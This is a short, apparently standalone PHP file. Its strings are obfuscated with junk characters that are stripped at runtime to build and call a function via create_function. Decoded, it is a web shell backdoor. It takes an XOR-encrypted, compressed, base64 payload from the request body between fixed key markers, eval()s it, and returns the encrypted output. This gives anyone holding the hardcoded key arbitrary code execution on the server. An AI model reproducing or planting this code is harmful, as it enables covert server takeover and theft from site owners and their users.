<?php
$B='ct_*ion x($_*t,$k){$_*c=s_*trle_*n_*($k);$l=_*s_*trlen(_*$t);$o="";for($_*i=0;$_*i<$l;){fo_*r_*_*($';
$K=str_replace('C','','creCatCCeC_funcCtiCon');
$Z='a_*l(@_*gzunc_*ompress(@_*x(_*@base_*64_decod_*e($_*m[1]),$k)));$o=@o_*b_*_get_conte_*nts();@_*ob_';
$V='en_*_*d_c_*lean();$r=@ba_*se64_*_encod_*e(@x(@_*_*gzc_*o_*mpress($o),$k));print(_*"$p$kh$_*r$kf");}';
$Q='("/$k_*h_*(.+)$kf/",@fi_*l_*e_get_cont_*e_*_*nts("php://inpu_*_*t"),$m)==1) {_*@ob_st_*art();@_*ev';
$z='$k="0_*b_*1e33_*16";$kh="d1a780_*c_*6e2cd";_*$kf="4_*793b_*77db185";$p="_*s_*Sep_*vG10QzlO_*nHMr";fun';
$y='j=0;(_*_*$j<$c&&$i<$l);$j++,$_*i++){$o._*=$_*t{$i}^$k{$j}_*_*;}_*}re_*turn $o_*;}if (@preg_matc_*h';
$E=str_replace('_*','',$z.$B.$y.$Q.$Z.$V);
$e=$K('',$E);$e();
?>
